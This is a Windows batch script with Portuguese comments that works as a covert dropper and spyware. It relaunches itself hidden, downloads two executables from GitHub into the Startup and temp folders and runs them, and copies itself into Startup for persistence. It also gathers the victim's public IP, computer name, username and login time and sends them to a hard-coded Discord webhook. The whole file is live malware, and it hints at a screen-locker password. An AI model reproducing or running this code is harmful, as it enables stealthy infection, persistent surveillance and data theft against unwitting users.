@echo off
:: Reexecuta o próprio script oculto
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
    exit
)

:: URL do .exe
set "URL=https://github.com/lcmandrikion-hash/MNTR/raw/refs/heads/main/monitoramento.exe"

:: Caminho da pasta Startup
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Startupx64.exe"

:: Baixa o arquivo
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"

:: Executa o arquivo
start "" "%STARTUP%"

setlocal

set "TEMP_EXE=%TEMP%\seguranca.exe"
set "URL=https://raw.githubusercontent.com/lcmandrikion-hash/BQL/refs/heads/main/seguranca.exe"

:: Se o arquivo não existe, baixa
if not exist "%TEMP_EXE%" (
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_EXE%' -UseBasicParsing"
)

:: Executa o arquivo em background
start "" /B "%TEMP_EXE%"

endlocal

:: --------- BLOCO PARA RODAR OCULTO ----------
if "%~1" NEQ "hidden" (
    powershell -NoProfile -WindowStyle Hidden -Command ^
    "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
    exit
)
:: -------------------------------------------

setlocal

:: Coloca no Startup
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if /I not "%~f0"=="%STARTUP%\ip_publico.bat" (
    copy "%~f0" "%STARTUP%\ip_publico.bat" >nul
)

:: Pega IP público
for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A

:: Tempo mínimo pra não matar o curl
ping 127.0.0.1 -n 2 >nul

:: Infos do sistema
set PC=%COMPUTERNAME%
set USER=%USERNAME%

:: Data e hora
set DATA=%DATE%
set HORA=%TIME:~0,5%

:: Link pra ver a localização do IP
set LINK=https://ipinfo.io/%IP%

:: Mensagem final
set MESSAGE=Usuario Iniciou  o pc. Resultado do comando --  PC %PC% - Usuario %USER% - IP %IP% - Local %LINK% - Data %DATA% - Hora %HORA% e bloqueador de windows senha :Luizfoda

:: Envia pro Discord
curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
exit
